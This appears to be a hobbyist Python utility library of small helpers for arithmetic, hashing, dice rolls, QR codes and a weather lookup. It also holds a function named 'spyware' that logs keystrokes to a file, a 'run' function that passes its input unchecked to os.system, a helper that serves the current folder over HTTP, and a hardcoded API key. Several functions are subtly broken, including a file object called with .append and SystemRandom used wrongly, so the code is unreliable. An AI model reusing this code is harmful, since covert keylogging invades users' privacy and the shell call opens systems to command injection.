import random
import hashlib
import time
import string
import os

def say(Print):
    print(Print)

def addnum(x, y):
    print(x + y)
    return x + y

def addfloat(f1, f2):
    print(f1+ f2)
    return f1 + f2

def Divide(a, b):
    print(a / b)
    return a / b

def genaratenumber(Low_number, High_number):
    x = random.randint(Low_number, High_number)
    print(x)
    return x

Pi = 3.1415926535897932384626433832795028841971693993751058209749445923078164062
E = 2.71828

Things_That_can_kill = ["🌱 Household Plants", "Lint", "♋ Cancer", "🥔 Overripe Potatoes", "Black licorice"]

def version():
    print("v2.9.7 gargling-pirate")

def CreateFile(name, content):
    with open(name, 'w') as foo:
        foo.write(content)

def Appendtofile(name, content):
    with open(name, 'a') as foo0:
        foo0.append(content)

def kill():
    exit()

def hashshaw256(Hashtext):
    my_str = Hashtext
    my_hash = hashlib.sha256(my_str.encode('utf-8')).hexdigest()
    print(my_hash)

def curtime():
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)
    print(current_time)

def help():
    print("https://github.com/Iwertyuiop123653/kitty-script-/wiki")

def wait(time_to_wait):
    time.sleep(time_to_wait)

def spyware(key_):
    import keyboard
    recorded_events = keyboard.record(key_)
    CreateFile("keylogged.txt", recorded_events)

def coinflip():
    head_or_tales = ["Tales", "Heads"]
    who_wins = random.choices(head_or_tales)
    print(who_wins)

def dice_roll():
    dice_sides = [1, 2, 3, 4, 5, 6]
    dice_side = random.choices(dice_sides)
    print(dice_side)

def checkemail(email):
    import re
    regex = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'  
    if(re.search(regex,email)):   
        print("Valid Email")   
    else:   
        print("Invalid Email")

def randomstring():
    print(''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12)))

def run(name_of_python_file):
    os.system(name_of_python_file)

def wnb(Number1, Number2):
    if Number1 > Number2:
        say("Number 1 is bigger")
    
    elif Number1 == Number2:
        say("Number 1 and 2 are the same")

    else:
        say("Number 1 is smaller than Number 2")


def UploadCurfolder(port):
    os.system(F"python -m http.server {port}")

def cute():
    print("bigge")

def SecureRandom(min, max):
    print(random.SystemRandom(min, max))

def Generateqrcode(URL):
    import qrcode
    qrcode.make(URL).save("qr.png", "PNG")

def weather(city_name):
    import requests

    api_key = "bc12083e70d2d22298c2df1cec7101d9"  # Enter the API key you got from the OpenWeatherMap website
    base_url = "http://api.openweathermap.org/data/2.5/weather?"
    complete_url = base_url + "appid=" + api_key + "&q=" + city_name  # This is to complete the base_url, you can also do this manually to checkout other weather data available
    response = requests.get(complete_url)
    x = response.json()

    if x["cod"] != "404":
        y = x["main"]

        current_temperature = y["temp"]
        z = x["weather"]


        print("Temperature (in kelvin unit) = " +
                       str(current_temperature))


    else:
        print("City Not Found ")